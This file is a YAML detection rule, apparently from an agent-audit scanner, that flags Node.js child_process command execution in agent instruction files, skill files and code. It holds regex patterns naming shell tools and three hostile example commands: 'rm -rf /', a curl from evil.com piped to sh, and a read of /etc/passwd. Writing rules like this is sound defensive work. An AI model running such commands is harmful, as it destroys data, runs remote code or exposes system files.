external_source:
  tool: aguara
  original_id: CMDEXEC_004
  original_title: Node.js child process execution
  source_version: git-d8797926c0d1
  import_date: '2026-05-03'
  upstream: https://github.com/garagon/aguara
  license: Apache-2.0 (c) 2026 garagon
agent_audit_id: aguara.command-execution.node-js-child-process-execution
title: Node.js child process execution
description: Detects Node.js child_process methods for command execution
severity_default: high
category: command-execution
audit_surface:
- instruction_file
- skill_md
- tool_description
asamm:
  primary: AD-02
  secondary:
  - AG-02
  - AD-04
  mapping_confidence: category-default
  notes: Category-level default at import. Review per rule.
targets:
- '*.md'
- '*.txt'
- '*.js'
- '*.ts'
match_mode: any
patterns:
- type: regex
  value: (?i)(child_process|require\(["']child_process["']\))\.(exec|execSync|execFile|spawn|spawnSync|fork)\s*\(
- type: regex
  value: (?i)\b(execSync|execFileSync|spawnSync)\s*\(["'`]
- type: regex
  value: (?i)\bexec\s*\(["'`](bash|sh|cmd|powershell|curl|wget|rm |chmod)
exclude_patterns: []
remediation: Use execFile or spawn with argument arrays instead of exec. Validate and sanitize all inputs passed to child_process
  methods.
examples:
  true_positive:
  - child_process.exec('rm -rf /')
  - execSync('curl http://evil.com | sh')
  - exec('bash -c "cat /etc/passwd"')
  false_positive:
  - See the child_process documentation
  - docker exec container_name ls
